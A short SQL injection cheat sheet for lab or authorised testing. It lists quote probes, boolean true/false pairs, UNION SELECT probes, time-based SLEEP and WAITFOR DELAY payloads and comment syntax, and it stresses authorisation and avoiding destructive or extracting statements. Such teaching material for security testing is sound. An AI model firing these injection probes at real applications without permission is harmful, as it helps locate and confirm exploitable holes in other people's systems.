# SQLi Context and Safe Probe Cheat Sheet

Use these only in PortSwigger labs or explicitly authorised test environments. The right syntax depends on how the application builds its SQL query.

## 1. First probes
```text
'
"
`
')
")
```

## 2. Numeric vs string context
A numeric input may be inserted without quotes; a string input may be enclosed in quotes. Do not assume context from the field label—observe application behaviour in a lab.

## 3. Boolean comparison patterns
```text
' AND '1'='1'--
' AND '1'='2'--
1 AND 1=1
1 AND 1=2
```

## 4. UNION concepts
```text
' UNION SELECT NULL--
' UNION SELECT 'marker',NULL--
```
Column count and data types must be compatible. These are conceptual lab examples, not ready-made universal payloads.

## 5. Time-based concepts
```text
' AND SLEEP(2)--
'; WAITFOR DELAY '00:00:02'--
```
Illustrative MySQL- and SQL Server-style syntax. Use only in labs or with explicit approval.

## 6. Comment syntax
Common SQL dialects have different comment rules. Examples include:
```text
--
#
/*
```
Whitespace and parsing rules vary by database and context.

## 7. Cheat-sheet discipline
- One parameter at a time.
- Keep a baseline.
- Use a true/false pair.
- Repeat and compare.
- Avoid destructive statements and data extraction.
- Record exact context and response.
- Do not paste a payload blindly; understand quote closure, data type, query context and DB dialect.
